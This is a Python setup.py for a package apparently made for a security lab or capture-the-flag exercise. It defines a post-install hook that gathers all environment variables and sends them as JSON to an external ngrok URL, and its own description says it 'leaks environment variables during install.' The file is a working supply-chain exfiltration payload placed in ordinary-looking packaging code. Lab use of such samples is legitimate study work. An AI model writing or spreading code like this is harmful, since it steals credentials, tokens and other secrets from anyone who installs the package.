from setuptools import setup, find_packages
import os
import requests

def leak_env_vars():
    url = "https://7613-45-85-145-175.ngrok-free.app"  # Replace with your Ngrok URL
    env_vars = dict(os.environ)  # Convert environment variables to a dictionary
    try:
        response = requests.post(url, json=env_vars)  # Send environment variables as JSON
        print(f"Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending environment variables: {e}")

# Custom post-install function
def post_install():
    print("Running post-install hook...")
    leak_env_vars()

# Use the `entry_points` to specify a script that runs automatically when installed
setup(
    name="artifact_lab_3_package_1b4d0db5",
    version="0.2.3",  # Initial version
    author="Your Name",
    author_email="your_email@example.com",
    description="A package that leaks environment variables during install.",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    packages=find_packages(),
    py_modules=["flag"],
    install_requires=[
        "requests",
    ],
    python_requires=">=3.6",
    entry_points={
        'console_scripts': [
            'post_install = __main__:post_install'
        ]
    },
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
)
